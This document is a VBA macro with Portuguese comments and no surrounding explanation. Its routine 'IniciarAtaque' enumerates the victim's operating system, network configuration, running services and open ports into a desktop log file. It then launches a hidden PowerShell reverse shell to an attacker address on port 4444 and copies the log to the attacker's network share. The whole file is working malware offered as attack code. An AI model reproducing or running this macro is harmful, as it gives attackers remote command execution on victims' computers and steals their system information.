Sub IniciarAtaque()

    ' Caminho do arquivo de log
    Dim fso As Object
    Dim arquivo As Object
    Dim caminho As String
    caminho = Environ("USERPROFILE") & "\Desktop\enum_resultados.txt"

    ' Inicializa o FileSystemObject
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set arquivo = fso.CreateTextFile(caminho, True)

    ' Escreve a data e hora no arquivo
    arquivo.WriteLine "Data e Hora: " & Now()

    ' Enumera o sistema operacional
    Dim os As String
    os = CreateObject("WScript.Shell").Exec("cmd /c ver").StdOut.ReadAll
    arquivo.WriteLine "Sistema Operacional: " & os

    ' Coleta o IP local
    Dim ip As String
    ip = CreateObject("WScript.Shell").Exec("cmd /c ipconfig").StdOut.ReadAll
    arquivo.WriteLine "IP Configuração: " & ip
    
    ' Enumera os serviços em execução (simplificado)
    Dim serviços As String
    serviços = CreateObject("WScript.Shell").Exec("cmd /c net start").StdOut.ReadAll
    arquivo.WriteLine "Serviços em Execução: " & vbCrLf & serviços

    ' Enumera portas ativas
    Dim portas As String
    portas = CreateObject("WScript.Shell").Exec("cmd /c netstat -an").StdOut.ReadAll
    arquivo.WriteLine "Portas Ativas: " & vbCrLf & portas
    
    ' Fecha o arquivo de log
    arquivo.Close

    ' Criar uma reverse shell
    CriarReverseShell "192.168.1.100", 4444 ' Substitua pelo IP e Porta do atacante
    
    ' Tentar enviar o arquivo de log via compartilhamento de rede
    EnviarLogParaAtacante "192.168.1.100", "compartilhamento", "enum_resultados.txt"
    
End Sub

Sub CriarReverseShell(ip_atacante As String, porta As Integer)
    Dim comando As String
    comando = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command ""$client = New-Object System.Net.Sockets.TCPClient('" & ip_atacante & "'," & porta & ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
    
    ' Executar a reverse shell
    CreateObject("WScript.Shell").Run comando, 0, False
End Sub

Sub EnviarLogParaAtacante(ip_atacante As String, compartilhamento As String, arquivo As String)
    Dim caminhoCompleto As String
    caminhoCompleto = Environ("USERPROFILE") & "\Desktop\" & arquivo
    
    ' Montar comando para copiar o arquivo para o compartilhamento de rede
    Dim comando As String
    comando = "cmd /c copy " & caminhoCompleto & " \\" & ip_atacante & "\" & compartilhamento & "\"

    ' Executar o comando de cópia
    CreateObject("WScript.Shell").Run comando, 0, False
End Sub
